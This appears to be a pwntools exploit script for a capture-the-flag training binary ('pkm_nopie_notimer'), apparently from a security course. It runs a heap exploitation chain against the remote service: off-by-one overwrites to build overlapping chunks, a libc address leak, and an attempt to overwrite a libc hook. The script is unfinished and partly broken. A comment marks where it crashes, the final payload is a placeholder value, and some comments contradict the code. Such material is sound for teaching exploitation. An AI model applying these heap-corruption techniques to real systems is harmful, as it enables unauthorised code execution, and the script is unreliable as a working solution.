#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host training.jinblack.it --port 65535 pkm_nopie_notimer
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('pkm_nopie_notimer')
libc = ELF("./libc-2.27_notcache.so")
ld = ELF("./ld-2.27.so")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'training.jinblack.it'
port = int(args.PORT or 65535)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
init-peda
tbreak main
break *0x0040166d
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)

io = start()

def add():
	io.recvuntil('> ')
	io.sendline(b'0')

def rename(n, name):
	io.recvuntil('> ')
	io.sendline(b'1')
	io.recvuntil('> ')
	io.sendline(b'{}'.format(n))
	io.recvuntil('[.] insert length: ')
	io.sendline(b'{}'.format(len(name)))
	io.sendline(b'{}'.format(name))

def delete(n):
	io.recvuntil('> ')
	io.sendline(b'2')
	io.recvuntil('> ')
	io.sendline(b'{}'.format(n))

def info(n):
	io.recvuntil('> ')
	io.sendline(b'4')
	io.sendline(b'{}'.format(n))
	io.recvuntil('Name:')
	name = io.recvuntil('\n')
	return name

# alloc 50 pkms
for i in range(8):
	add()

rename(0, 'A' * 0xf8)
rename(1, 'B' * 0x68)
rename(2, 'C' * 0xf8)
rename(3, 'D' * 0x10)

# delete chunk and move it down the heap
rename(0, 'a' * 0xff)

#delete(1)
rename(1, 'B' * 0x68)

for i in range(0x66, 0x5f, -1):
	rename(1, 'B' * i + '\x70\x01')

# checkpoint

rename(2, 'E' * 0xf6)

libc_offset = 0x3e2c80
libc_leak = info(1)[:-1] # somehow there was a character more '0xa7'
libc_leak = unpack(libc_leak + (8-len(libc_leak))*'\x00', 64) / 256
libc_base = libc_leak - libc_offset

print('[!] libc_leak: {}'.format(hex(libc_leak)))
print('[!] libc_base: {}'.format(hex(libc_base)))

# restore the size field (0x70) of chunk_BBB
for i in range(0xfd, 0xf7, -1):
  rename(2, 'E'*i + '\x70') # chunk_EEE, new_idx = 1

delete(0)
delete(1)
delete(2)
#add()
#add()
#add()
#rename(1, 'b' * 0x2ff)
#rename(2, 'e' * 0x2ff)

hook_offset = 0x3e2bd2 - 0x10
hook = libc_base + hook_offset

rename(4, 'G' * 0x100)

#foo = 0xdeadbeef
rename(4, 'F' * 0x100 + p64(hook).strip('\x00'))

# restore the size field (0x70) of the free'd chunk_BBB
for i in range(0xfe, 0xf7, -1):
  rename(4, 'f'*i + '\x70') # new_idx = 0

rename(5, 'B' * 0x68)

# crashes here
foo = 0xb00bb00b
rename(6, 'G' * 0x3e + p64(foo) + 'G' * 0x22)


rename(4, 'shrek')
delete(0)
#print(info(1))

io.interactive()

















